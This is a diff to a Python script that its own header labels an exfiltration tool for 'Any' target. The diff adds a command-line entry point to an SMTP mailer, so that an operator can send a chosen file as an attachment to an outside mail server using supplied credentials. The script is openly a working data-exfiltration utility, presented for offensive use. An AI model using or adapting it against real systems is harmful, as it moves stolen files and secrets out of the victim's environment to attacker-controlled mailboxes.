@@ -5,7 +5,7 @@
 # Version:	    1.0
 # Category:     exfiltration
 # Target: 	    Any
-
+import sys
 import smtplib, os
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
@@ -78,3 +78,15 @@ def send_mail(send_from, send_to, subject, text, files=None,
         smtp.login(username, password)
     smtp.sendmail(send_from, send_to, msg.as_string())
     smtp.close()
+    
+
+if len(sys.argv) > 8:
+    send_mail(sys.argv[1], sys.argv[2],
+                   sys.argv[3],
+                   sys.argv[4],
+                   server=sys.argv[5], username=sys.argv[6], password=sys.argv[7], files=[sys.argv[8]])
+else:
+    send_mail(sys.argv[1], sys.argv[2],
+                   sys.argv[3],
+                   sys.argv[4],
+server=sys.argv[5], username=sys.argv[6], password=sys.argv[7])
